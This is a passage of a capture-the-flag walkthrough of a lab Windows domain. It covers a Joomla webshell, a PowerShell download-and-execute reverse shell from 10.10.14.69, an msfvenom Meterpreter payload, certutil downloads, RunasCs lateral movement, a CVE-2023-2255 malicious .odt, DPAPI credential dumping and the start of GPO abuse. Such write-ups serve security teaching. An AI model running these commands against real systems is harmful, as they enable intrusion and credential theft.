Joomla as the user <code>administrator</code> is straightforward in most cases. The pentester will modify a PHP file, uploading a webshell inside a template. This time, the pentester chose <a href="https://github.com/flozz/p0wny-shell?tab=readme"><code>p0wny-shell</code></a> as the webshell.</li></ul><p><img alt=img decoding=async height=744 loading=lazy src=/_astro/Pasted%20image%2020240619142929.BHt2D7IU_1jyDCV.webp width=920></p><ul><li>Then, the pentester obtained a reverse shell using the PowerShell script <a href=https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1><code>Invoke-PowerShell.ps1</code></a>. He added a line at the end of the script to call the function.</li></ul><p><img alt=img decoding=async height=151 loading=lazy src=/_astro/Pasted%20image%2020240619143306.C-EjgeCt_2qvU9S.webp width=761></p><ul><li>Then, he simply executed the following command and received a reverse shell.</li></ul><pre class="astro-code github-dark" data-language=powershell style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#e1e4e8>powershell </span><span style=color:#f97583>-</span><span style=color:#e1e4e8>c IEX(</span><span style=color:#79b8ff>New-Object</span><span style=color:#e1e4e8> Net.WebClient).downloadString(</span><span style=color:#9ecbff>'http://10.10.14.69/Invoke-PowerShellTcp.ps1'</span><span style=color:#e1e4e8>)</span></span>
<span class=line></span></code></pre><p><img alt=img decoding=async height=232 loading=lazy src=/_astro/Pasted%20image%2020240619143917.CJBhg_pe_Juih2.webp width=1331></p><p><img alt=img decoding=async height=197 loading=lazy src=/_astro/Pasted%20image%2020240619143857.DDA4YWPm_IXx3H.webp width=1620></p><ul><li>Since the pentester had credentials for the user <code>tstark</code>, he used <a href=https://github.com/antonioCoco/RunasCs/releases><code>RunasCs.exe</code></a> to obtain a Meterpreter reverse shell as the user <code>tstark</code>.</li></ul><pre class="astro-code github-dark" data-language=shell style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>msfvenom</span><span style=color:#79b8ff> -p</span><span style=color:#9ecbff> windows/x64/meterpreter/reverse_https</span><span style=color:#9ecbff> lhost=</span><span style=color:#79b8ff>10.10.14.69</span><span style=color:#9ecbff> lport=</span><span style=color:#79b8ff>4445</span><span style=color:#79b8ff> -f</span><span style=color:#9ecbff> exe</span><span style=color:#79b8ff> -o</span><span style=color:#9ecbff> revshmet.exe</span></span>
<span class=line><span style=color:#e1e4e8>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span></span>
<span class=line><span style=color:#e1e4e8>[-] No arch selected, selecting arch: x64 from the payload</span></span>
<span class=line><span style=color:#b392f0>No</span><span style=color:#9ecbff> encoder</span><span style=color:#9ecbff> specified,</span><span style=color:#9ecbff> outputting</span><span style=color:#9ecbff> raw</span><span style=color:#9ecbff> payload</span></span>
<span class=line><span style=color:#b392f0>Payload</span><span style=color:#9ecbff> size:</span><span style=color:#79b8ff> 609</span><span style=color:#9ecbff> bytes</span></span>
<span class=line><span style=color:#b392f0>Final</span><span style=color:#9ecbff> size</span><span style=color:#9ecbff> of</span><span style=color:#9ecbff> exe</span><span style=color:#9ecbff> file:</span><span style=color:#79b8ff> 7168</span><span style=color:#9ecbff> bytes</span></span>
<span class=line><span style=color:#b392f0>Saved</span><span style=color:#9ecbff> as:</span><span style=color:#9ecbff> revshmet.exe</span></span>
<span class=line></span></code></pre><ul><li>He uploaded the necessary files to the writable directory <code>c:\windows\tasks</code> using <code>certutil.exe</code> and granted <code>Full</code> privileges to the <code>Everyone</code> group for the executable <code>revshmet.exe</code>.</li></ul><pre class="astro-code github-dark" data-language=shell style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>PS</span><span style=color:#9ecbff> C:</span><span style=color:#79b8ff>\w</span><span style=color:#9ecbff>indows</span><span style=color:#79b8ff>\t</span><span style=color:#9ecbff>ask</span><span style=color:#e1e4e8>s</span><span style=color:#f97583>></span><span style=color:#9ecbff> certutil.exe</span><span style=color:#79b8ff> -f</span><span style=color:#79b8ff> -urlcache</span><span style=color:#79b8ff> -split</span><span style=color:#9ecbff> http://10.10.14.69/RunasCs.exe</span></span>
<span class=line><span style=color:#b392f0>PS</span><span style=color:#9ecbff> C:</span><span style=color:#79b8ff>\w</span><span style=color:#9ecbff>indows</span><span style=color:#79b8ff>\t</span><span style=color:#9ecbff>ask</span><span style=color:#e1e4e8>s</span><span style=color:#f97583>></span><span style=color:#9ecbff> certutil.exe</span><span style=color:#79b8ff> -f</span><span style=color:#79b8ff> -urlcache</span><span style=color:#79b8ff> -split</span><span style=color:#9ecbff> http://10.10.14.69/revshmet.exe</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=shell style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>PS</span><span style=color:#9ecbff> C:</span><span style=color:#79b8ff>\w</span><span style=color:#9ecbff>indows</span><span style=color:#79b8ff>\t</span><span style=color:#9ecbff>ask</span><span style=color:#e1e4e8>s</span><span style=color:#f97583>></span><span style=color:#9ecbff> dir</span></span>
<span class=line><span style=color:#b392f0>    Directory:</span><span style=color:#9ecbff> C:</span><span style=color:#79b8ff>\w</span><span style=color:#9ecbff>indows</span><span style=color:#79b8ff>\t</span><span style=color:#9ecbff>asks</span></span>
<span class=line><span style=color:#b392f0>Mode</span><span style=color:#9ecbff>                 LastWriteTime</span><span style=color:#9ecbff>         Length</span><span style=color:#9ecbff> Name</span><span style=color:#e1e4e8>                                                              </span></span>
<span class=line><span style=color:#b392f0>----</span><span style=color:#79b8ff>                 -------------</span><span style=color:#79b8ff>         ------</span><span style=color:#79b8ff> ----</span><span style=color:#e1e4e8>                                                              </span></span>
<span class=line><span style=color:#e1e4e8>                                                        </span></span>
<span class=line><span style=color:#b392f0>-a----</span><span style=color:#9ecbff>         6/19/2024</span><span style=color:#9ecbff>   8:50</span><span style=color:#9ecbff> PM</span><span style=color:#79b8ff>           7168</span><span style=color:#9ecbff> revshmet.exe</span><span style=color:#e1e4e8>                                                      </span></span>
<span class=line><span style=color:#b392f0>-a----</span><span style=color:#9ecbff>         6/19/2024</span><span style=color:#9ecbff>   8:48</span><span style=color:#9ecbff> PM</span><span style=color:#79b8ff>          51712</span><span style=color:#9ecbff> RunasCs.exe</span><span style=color:#e1e4e8>  </span></span>
<span class=line></span></code></pre><blockquote><p>Comments: It is important to grant <code>Full</code> privileges to the <code>Everyone</code> group for the executable <code>revshmet.exe</code> so that <code>RunasCs.exe</code> can execute it correctly.</p></blockquote><pre class="astro-code github-dark" data-language=shell style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>cmd</span><span style=color:#9ecbff> /c</span><span style=color:#9ecbff> "icacls C:\windows\tasks\revshmet.exe  /grant Everyone:(F)"</span></span>
<span class=line></span></code></pre><blockquote><p><img alt=img decoding=async height=186 loading=lazy src=/_astro/Pasted%20image%2020240619163017.DLA-OYZR_27LrrC.webp width=1473></p></blockquote><ul><li>With all that done, he executed <code>RunasCs.exe</code>, received the reverse shell as the user <code>tstark</code>, and was able to read <code>user.txt</code>.</li></ul><pre class="astro-code github-dark" data-language=shell style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>c:\windows\tasks\RunasCs.exe</span><span style=color:#9ecbff> tstark</span><span style=color:#9ecbff> playboy69</span><span style=color:#9ecbff> c:</span><span style=color:#79b8ff>\w</span><span style=color:#9ecbff>indows</span><span style=color:#79b8ff>\t</span><span style=color:#9ecbff>asks</span><span style=color:#79b8ff>\r</span><span style=color:#9ecbff>evshmet.exe</span></span>
<span class=line></span></code></pre><p><img alt=img decoding=async height=357 loading=lazy src=/_astro/Pasted%20image%2020240619163204.Cz1e_7AK_Z2kOvJT.webp width=955></p><h2 id=shell-as-ppotts-user>Shell as “ppotts” user<a href=#shell-as-ppotts-user class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><ul><li><p>After extensive enumeration, the pentester noticed that port <code>8083</code> was <code>LISTENING</code> on all interfaces, but this was not reported in the <code>nmap</code> scan. Therefore, he decided to forward this port using <code>chisel.exe</code>.</p></li><li><p>He uploaded the file <code>chisel_windows_amd64.exe</code> using the <code>upload</code> command of <code>meterpreter</code>.</p></li></ul><pre class="astro-code github-dark" data-language=shell style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>upload</span><span style=color:#9ecbff> chisel_windows_amd64.exe</span><span style=color:#9ecbff> c:</span><span style=color:#79b8ff>\\</span><span style=color:#9ecbff>windows</span><span style=color:#79b8ff>\\</span><span style=color:#9ecbff>tasks</span></span>
<span class=line></span></code></pre><p><img alt=img decoding=async height=162 loading=lazy src=/_astro/Pasted%20image%2020240619170205.BY82pDJn_Z1nwuFV.webp width=942></p><ul><li>He forwarded port <code>8083</code> to port <code>8083</code> on his attack machine.</li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>c:\windows\tasks\chisel_windows_amd64.exe</span><span style=color:#9ecbff> client</span><span style=color:#9ecbff> 10.10.14.69:8050</span><span style=color:#9ecbff> R:8083:127.0.0.1:8083</span></span>
<span class=line></span></code></pre><p><img alt=img decoding=async height=557 loading=lazy src=/_astro/Pasted%20image%2020240619172449.DKR3OKfw_1jxrpj.webp width=948></p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>chisel</span><span style=color:#9ecbff> server</span><span style=color:#79b8ff> -p</span><span style=color:#79b8ff> 8050</span><span style=color:#79b8ff> --reverse</span></span>
<span class=line></span></code></pre><ul><li><p>Given that port <code>8083</code> is accessible, the pentester inspected the website.</p></li><li><p>The pentester found it strange that uploading <code>.odt</code> files was allowed. After a quick search for recent vulnerabilities, he discovered <code>CVE-2023-2255</code>.</p></li></ul><p><img alt=img decoding=async height=242 loading=lazy src=/_astro/Pasted%20image%2020240620003131.BZSG6JxM_1j5FLF.webp width=315></p><ul><li>The CVE affects versions of <code>LibreOffice prior to 6.3</code>, allowing command execution upon opening files without any alerts. This stems from inadequate access controls in editor components handling documents with ‘floating frames’ linked to external files. The pentester discovered the target was running <code>LibreOffice 5.2.6.2</code> and due to the suggestive message indicating that a user would be reviewing the <code>resume</code> sent in the form <code>Job Application Submission</code>, he attempted to exploit this vulnerability</li></ul><pre class="astro-code github-dark" data-language=shell style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>powershell</span><span style=color:#79b8ff> -c</span><span style=color:#9ecbff> "Get-WmiObject -Class Win32_Product |  select Name, Version"</span></span>
<span class=line></span></code></pre><p><img alt=img decoding=async height=392 loading=lazy src=/_astro/Pasted%20image%2020240620004520.4FdIc_vL_29mxYf.webp width=993></p><blockquote><p>Comments: If you want to learn more about this vulnerability, check out the repository of <a href="https://github.com/Icare1337/LibreOffice_Tips_Bug_Bounty/commits?author=Icare1337">Icare1337</a> for <a href=https://github.com/Icare1337/LibreOffice_Tips_Bug_Bounty/tree/main/CVE-2023-2255>CVE-2023-2255</a>. {: .prompt-info }</p></blockquote><ul><li><a href=https://github.com/elweth-sec><code>elweth-sec</code></a> has an excellent <a href=https://github.com/elweth-sec/CVE-2023-2255>PoC</a>. The pentester used this PoC to generate a malicious <code>.odt</code> (<code>exploit.odt</code>) file, which will execute the payload generated earlier using <code>msfvenom</code> (<code>revshmet.exe</code>). This way, he would be able to obtain a reverse shell as the user who was reviewing the odt files.</li></ul><pre class="astro-code github-dark" data-language=shell style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>python3</span><span style=color:#9ecbff> CVE-2023-2255.py</span><span style=color:#79b8ff> --cmd</span><span style=color:#9ecbff> 'c:\windows\task\revshmet.exe'</span><span style=color:#79b8ff> --output</span><span style=color:#9ecbff> 'exploit.odt'</span></span>
<span class=line></span></code></pre><p><img alt=img decoding=async height=111 loading=lazy src=/_astro/Pasted%20image%2020240619175337.Sd7K4V4h_j2SEI.webp width=900></p><ul><li>Then the pentester proceeded to upload the <code>exploit.odt</code> file to the target website located on port <code>8083</code>. Assuming there is a user reviewing the Job Application Submissions, the payload executed successfully. After some time, great! The pentester received a reverse shell as another user named <code>ppotts</code>.</li></ul><p><img alt=img decoding=async height=789 loading=lazy src=/_astro/Pasted%20image%2020240619175643.zSCsthjM_1eXth4.webp width=800></p><p><img alt=img decoding=async height=347 loading=lazy src=/_astro/Pasted%20image%2020240619175817.dLCN8Wkj_Z2gHn34.webp width=924></p><h2 id=gpo-abuse-and-roottxt>GPO Abuse and <strong>root.txt</strong><a href=#gpo-abuse-and-roottxt class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><ul><li><p>After extensive enumeration, the pentester executed <code>winpeasx64.exe</code> to thoroughly enumerate for any details that might have been overlooked. In doing so, he discovered the existence of <code>DPAPI Credentials file</code> and <code>DPAPI Master Keys</code>!!</p></li><li><p>There are different ways to read the <code>DPAPI Credentials file</code>, from manual to automated ways, in this case the pentester used the automated way.</p></li></ul><blockquote><p>Tip: It’s worth mentioning that the latest version of the tool <a href=https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpDPAPI.exe><code>SharpDPAPI</code></a> is capable of extracting credentials protected by DPAPI. {: .prompt-tip }</p></blockquote><ul><li>Upload <code>SharpDPAPI.exe</code></li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>upload</span><span style=color:#9ecbff> SharpDPAPI.exe</span><span style=color:#9ecbff> c:</span><span style=color:#79b8ff>\\</span><span style=color:#9ecbff>windows</span><span style=color:#79b8ff>\\</span><span style=color:#9ecbff>tasks</span></span>
<span class=line></span></code></pre><p><img alt=img decoding=async height=101 loading=lazy src=/_astro/Pasted%20image%2020240619201246.DgyelLls_1NiOYe.webp width=911></p><ul><li>Execute <code>SharpDPAPI.exe</code></li></ul><pre class="astro-code github-dark" data-language=shell style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>c:\windows\tasks\SharpDPAPI.exe</span><span style=color:#9ecbff> credentials</span><span style=color:#9ecbff> /rpc</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>  __</span><span style=color:#9ecbff>                 _</span><span style=color:#9ecbff>   _</span><span style=color:#9ecbff>       _</span><span style=color:#9ecbff> ___</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#e1e4e8> (</span><span style=color:#b392f0>_</span><span style=color:#f97583>  |</span><span style=color:#b392f0>_</span><span style=color:#9ecbff>   _.</span><span style=color:#9ecbff> ._</span><span style=color:#9ecbff> ._</span><span style=color:#f97583>  |</span><span style=color:#b392f0> \</span><span style=color:#f97583> |</span><span style=color:#b392f0>_</span><span style=color:#e1e4e8>) </span><span style=color:#b392f0>/\</span><span style=color:#f97583>  |</span><span style=color:#b392f0>_</span><span style=color:#e1e4e8>) </span><span style=color:#f97583>|</span><span style=color:#e1e4e8>  </span></span>
<span class=line><span style=color:#b392f0> __</span><span style=color:#e1e4e8>) </span><span style=color:#f97583>|</span><span style=color:#f97583> |</span><span style=color:#e1e4e8> (</span><span style=color:#b392f0>_</span><span style=color:#f97583>|</span><span style=color:#f97583> |</span><span style=color:#f97583>  |</span><span style=color:#b392f0>_</span><span style=color:#e1e4e8>) </span><span style=color:#f97583>|</span><span style=color:#b392f0>_/</span><span style=color:#f97583> |</span><span style=color:#b392f0>  /--\</span><span style=color:#f97583> |</span><span style=color:#b392f0>  _</span><span style=color:#f97583>|</span><span style=color:#b392f0>_</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#f97583>                |</span><span style=color:#e1e4e8>                      </span></span>
<span class=line><span style=color:#b392f0>  v1.12.0</span><span style=color:#e1e4e8>                               </span></span>
<span class=line></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>[</span><span style=color:#f97583>*</span><span style=color:#e1e4e8>] Action: User DPAPI Credential Triage</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>[</span><span style=color:#f97583>*</span><span style=color:#e1e4e8>] Will ask a domain controller to decrypt masterkeys </span><span style=color:#f97583>for</span><span style=color:#e1e4e8> us</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>[</span><span style=color:#f97583>*</span><span style=color:#e1e4e8>] Found MasterKey </span><span style=color:#79b8ff>:</span><span style=color:#e1e4e8> C:</span><span style=color:#79b8ff>\U</span><span style=color:#e1e4e8>sers</span><span style=color:#79b8ff>\P</span><span style=color:#e1e4e8>Potts</span><span style=color:#79b8ff>\A</span><span style=color:#e1e4e8>ppData</span><span style=color:#79b8ff>\R</span><span style=color:#e1e4e8>oaming</span><span style=color:#79b8ff>\M</span><span style=color:#e1e4e8>icrosoft</span><span style=color:#79b8ff>\P</span><span style=color:#e1e4e8>rotect</span><span style=color:#79b8ff>\S</span><span style=color:#e1e4e8>-1-5-21-1199398058-4196589450-691661856-1107</span><span style=color:#79b8ff>\1</span><span style=color:#e1e4e8>0811601-0fa9-43c2-97e5-9bef8471fc7d</span></span>
<span class=line><span style=color:#e1e4e8>[</span><span style=color:#f97583>*</span><span style=color:#e1e4e8>] Found MasterKey </span><span style=color:#79b8ff>:</span><span style=color:#e1e4e8> C:</span><span style=color:#79b8ff>\U</span><span style=color:#e1e4e8>sers</span><span style=color:#79b8ff>\P</span><span style=color:#e1e4e8>Potts</span><span style=color:#79b8ff>\A</span><span style=color:#e1e4e8>ppData</span><span style=color:#79b8ff>\R</span><span style=color:#e1e4e8>oaming</span><span style=color:#79b8ff>\M</span><span style=color:#e1e4e8>icrosoft</span><span style=color:#79b8ff>\P</span><span style=color:#e1e4e8>rotect</span><span style=color:#79b8ff>\S</span><span style=color:#e1e4e8>-1-5-21-1199398058-4196589450-691661856-1107</span><span style=color:#79b8ff>\1</span><span style=color:#e1e4e8>91d3f9d-7959-4b4d-a520-a444853c47eb</span></span>
<span class=line><span style=color:#e1e4e8>[</span><span style=color:#f97583>*</span><span style=color:#e1e4e8>] Found MasterKey </span><span style=color:#79b8ff>:</span><span style=color:#e1e4e8> C:</span><span style=color:#79b8ff>\U</span><span style=color:#e1e4e8>sers</span><span style=color:#79b8ff>\P</span><span style=color:#e1e4e8>Potts</span><span style=color:#79b8ff>\A</span><span style=color:#e1e4e8>ppData</span><span style=color:#79b8ff>\R</span><span style=color:#e1e4e8>oaming</span><span style=color:#79b8ff>\M</span><span style=color:#e1e4e8>icrosoft</span><span style=color:#79b8ff>\P</span><span style=color:#e1e4e8>rotect</span><span style=color:#79b8ff>\S</span><span style=color:#e1e4e8>-1-5-21-1199398058-4196589450-691661856-1107</span><span style=color:#79b8ff>\f</span><span style=color:#e1e4e8>b2eb8a9-12f7-4f07-83ee-d2cd6aae71c0</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>[</span><span style=color:#f97583>*</span><span style=color:#e1e4e8>] Preferred master keys:</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107:fb2eb8a9-12f7-4f07-83ee-d2cd6aae71c0</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>[</span><span style=color:#f97583>*</span><span style=color:#e1e4e8>] User master key cache:</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>{</span><span style=color:#b392f0>10811601-0fa9-43c2-97e5-9bef8471fc7d}:FBAB11CACDD8407E8DB9604F0F8C92178BEE6FD3</span></span>
<span class=line><span style=color:#e1e4e8>{</span><span style=color:#b392f0>191d3f9d-7959-4b4d-a520-a444853c47eb}:85285EB368BEFB1670633B05CE58CA4D75C73C77</span></span>
<span class=line><span style=color:#e1e4e8>{</span><span style=color:#b392f0>fb2eb8a9-12f7-4f07-83ee-d2cd6aae71c0}:33DB2B821336CD6E93872AD397CB6960F1E9EEBA</span></span>
<span class=line></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>[</span><span style=color:#f97583>*</span><span style=color:#e1e4e8>] Triaging Credentials </span><span style=color:#f97583>for</span><span style=color:#e1e4e8> current user</span></span>
<span class=line></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>Folder</span><span style=color:#9ecbff>       :</span><span style=color:#9ecbff> C:</span><span style=color:#79b8ff>\U</span><span style=color:#9ecbff>sers</span><span style=color:#79b8ff>\P</span><span style=color:#9ecbff>Potts</span><span style=color:#79b8ff>\A</span><span style=color:#9ecbff>ppData</span><span style=color:#79b8ff>\R</span><span style=color:#9ecbff>oaming</span><span style=color:#79b8ff>\M</span><span style=color:#9ecbff>icrosoft</span><span style=color:#79b8ff>\C</span><span style=color:#9ecbff>redentials</span><span style=color:#79b8ff>\</span></span>
<span class=line></span>
<span class=line><span style=color:#9ecbff>  CredFile</span><span style=color:#9ecbff>           :</span><span style=color:#9ecbff> 18A1927A997A794B65E9849883AC3F3E</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>    guidMasterKey</span><span style=color:#9ecbff>    :</span><span style=color:#9ecbff> {191d3f9d-7959-4b4d-a520-a444853c47eb}</span></span>
<span class=line><span style=color:#b392f0>    size</span><span style=color:#9ecbff>             :</span><span style=color:#79b8ff> 358</span></span>
<span class=line><span style=color:#b392f0>    flags</span><span style=color:#9ecbff>            :</span><span style=color:#79b8ff> 0x20000000</span><span style=color:#e1e4e8> (CRYPTPROTECT_SYSTEM)</span></span>
<span class=line><span style=color:#b392f0>    algHash/algCrypt</span><span style=color:#9ecbff> :</span><span style=color:#79b8ff> 32772</span><span style=color:#e1e4e8> (CALG_SHA) / 26115 (</span><span style=color:#b392f0>CALG_3DES</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>    description</span><span style=color:#9ecbff>      :</span><span style=color:#9ecbff> Enterprise</span><span style=color:#9ecbff> Credential</span><span style=color:#9ecbff> Data</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>    LastWritten</span><span style=color:#9ecbff>      :</span><span style=color:#9ecbff> 5/9/2023</span><span style=color:#9ecbff> 2:08:54</span><span style=color:#9ecbff> PM</span></span>
<span class=line><span style=color:#b392f0>    TargetName</span><span style=color:#9ecbff>       :</span><span style=color:#9ecbff> LegacyGeneric:target=MyTarget</span></span>
<span class=line><span style=color:#b392f0>    TargetAlias</span><span style=color:#9ecbff>      :</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>    Comment</span><span style=color:#9ecbff>          :</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>    UserName</span><span style=color:#9ecbff>         :</span><span style=color:#9ecbff> MyUser</span></span>
<span class=line><span style=color:#b392f0>    Credential</span><span style=color:#9ecbff>       :</span><span style=color:#e1e4e8> </span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>  CredFile</span><span style=color:#9ecbff>           :</span><span style=color:#9ecbff> 84F1CAEEBF466550F4967858F9353FB4</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>    guidMasterKey</span><span style=color:#9ecbff>    :</span><span style=color:#9ecbff> {191d3f9d-7959-4b4d-a520-a444853c47eb}</span></span>
<span class=line><span style=color:#b392f0>    size</span><span style=color:#9ecbff>             :</span><span style=color:#79b8ff> 398</span></span>
<span class=line><span style=color:#b392f0>    flags</span><span style=color:#9ecbff>            :</span><span style=color:#79b8ff> 0x20000000</span><span style=color:#e1e4e8> (CRYPTPROTECT_SYSTEM)</span></span>
<span class=line><span style=color:#b392f0>    algHash/algCrypt</span><span style=color:#9ecbff> :</span><span style=color:#79b8ff> 32772</span><span style=color:#e1e4e8> (CALG_SHA) / 26115 (</span><span style=color:#b392f0>CALG_3DES</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>    description</span><span style=color:#9ecbff>      :</span><span style=color:#9ecbff> Enterprise</span><span style=color:#9ecbff> Credential</span><span style=color:#9ecbff> Data</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>    LastWritten</span><span style=color:#9ecbff>      :</span><span style=color:#9ecbff> 5/9/2023</span><span style=color:#9ecbff> 4:03:21</span><span style=color:#9ecbff> PM</span></span>
<span class=line><span style=color:#b392f0>    TargetName</span><span style=color:#9ecbff>       :</span><span style=color:#9ecbff> Domain:interactive=OFFICE</span><span style=color:#79b8ff>\H</span><span style=color:#9ecbff>Hogan</span></span>
<span class=line><span style=color:#b392f0>    TargetAlias</span><span style=color:#9ecbff>      :</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>    Comment</span><span style=color:#9ecbff>          :</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>    UserName</span><span style=color:#9ecbff>         :</span><span style=color:#9ecbff> OFFICE</span><span style=color:#79b8ff>\H</span><span style=color:#9ecbff>Hogan</span></span>
<span class=line><span style=color:#b392f0>    Credential</span><span style=color:#9ecbff>       :</span><span style=color:#9ecbff> H4ppyFtW183#</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>  CredFile</span><span style=color:#9ecbff>           :</span><span style=color:#9ecbff> E76CCA3670CD9BB98DF79E0A8D176F1E</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>    guidMasterKey</span><span style=color:#9ecbff>    :</span><span style=color:#9ecbff> {10811601-0fa9-43c2-97e5-9bef8471fc7d}</span></span>
<span class=line><span style=color:#b392f0>    size</span><span style=color:#9ecbff>             :</span><span style=color:#79b8ff> 374</span></span>
<span class=line><span style=color:#b392f0>    flags</span><span style=color:#9ecbff>            :</span><span style=color:#79b8ff> 0x20000000</span><span style=color:#e1e4e8> (CRYPTPROTECT_SYSTEM)</span></span>
<span class=line><span style=color:#b392f0>    algHash/algCrypt</span><span style=color:#9ecbff> :</span><span style=color:#79b8ff> 32772</span><span style=color:#e1e4e8> (CALG_SHA) / 26115 (</span><span style=color:#b392f0>CALG_3DES</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>    description</span><span style=color:#9ecbff>      :</span><span style=color:#9ecbff> Enterprise</span><span style=color:#9ecbff> Credential</span><span style=color:#9ecbff> Data</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>    LastWritten</span><span style=color:#9ecbff>      :</span><span style=color:#9ecbff> 1/18/2024</span><span style=color:#9ecbff> 11:53:30</span><span style=color:#9ecbff> AM</span></span>
<span class=line><span style=color:#b392f0>    TargetName</span><span style=color:#9ecbff>       :</span><span style=color:#9ecbff> Domain:interactive=office</span><span style=color:#79b8ff>\h</span><span style=color:#9ecbff>hogan</span></span>
<span class=line><span style=color:#b392f0>    TargetAlias</span><span style=color:#9ecbff>      :</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>    Comment</span><span style=color:#9ecbff>          :</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>    UserName</span><span style=color:#9ecbff>         :</span><span style=color:#9ecbff> office</span><span style=color:#79b8ff>\h</span><span style=color:#9ecbff>hogan</span></span>
<span class=line><span style=color:#b392f0>    Credential</span><span style=color:#9ecbff>       :</span><span style=color:#e1e4e8> </span></span>
<span class=line></span>
<span class=line></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>SharpDPAPI</span><span style=color:#9ecbff> completed</span><span style=color:#9ecbff> in</span><span style=color:#9ecbff> 00:00:00.2319211</span></span>
<span class=line></span></code></pre><p><img alt=img decoding=async height=283 loading=lazy src=/_astro/Pasted%20image%2020240619210210.LHA18gU4_Z11VtAJ.webp width=642></p><ul><li>Great! The pentester obtained a new credential pair (<code>HHogan</code>:<code>H4ppyFtW183#</code>). Afterwards, he achieved a reverse shell as <code>HHogan</code> using the same <code>revshmet.exe</code> payload, which was executed by <code>RunasCs.exe</code>.</li></ul><p><img alt=img decoding=async height=223 loading=lazy src=/_astro/Pasted%20image%2020240619213111.DUiyMOQZ_1Pq2M7.webp width=490></p><ul><li>While reviewing <code>BloodHound</code> for information on the user <code>HHogan</code>, the pentester found that the user had <code>GenericWrite</code> permissions on <code>Default Domain Policy</code> and <code>Default Domain Controllers Policy</code>.</li></ul><p><img alt=img decoding=async height=577 loading=lazy src=/_astro/Pasted%20image%2020240620010610.Dza0yVTJ_Nh2AC.webp width=1549></p><ul><li><code>BloodHound</code> indicates the actions that could be performed to exploit the <code>GenericWrite</code> grant on a <code>Group Policy Object</code>.</li></ul><p><img alt=img decoding=async height=448 loading=lazy src=/_astro/Pasted%20image%2020240620010523.C-BNIInB_Sdysb.webp width=784></p><ul><li>After searching for tools that allow this rights to be abused, he found <code>SharpGPOAbuse.exe</code>. <code>SharpGPOAbuse.exe</code> is a .NET tool that exploits user edit rights on a <code>Group Policy Object</code> (GPO) to compromise managed objects. Therefore, the pentester uploaded <code>SharpGPOAbuse.exe</code> to the target host in order to exploit it.</li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>upload</span><span style=color:#9ecbff> SharpGPOAbuse.exe</span><span style=color:#9ecbff> c:</span><span style=color:#79b8ff>\\</span><span style=color:#9ecbff>windows</span><span style=color:#79b8ff>\\</span><span style=color:#9ecbff>tasks</span></span>
